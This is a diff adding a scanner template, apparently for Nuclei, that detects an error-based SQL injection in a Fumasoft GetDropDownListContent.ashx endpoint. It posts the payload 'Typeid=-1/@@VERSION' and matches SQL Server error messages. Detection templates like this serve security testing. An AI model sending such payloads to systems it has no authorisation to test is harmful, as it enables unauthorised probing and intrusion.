@@ -1,0 +1,28 @@
+id: poc-yaml-fumasoft-getdropdownlistcontent-ashx-sqli
+info:
+  name: Fumasoft GetDropDownListContent.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Ajax/GetDropDownListContent.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=getType&Typeid=-1/@@VERSION"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "Exception:"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
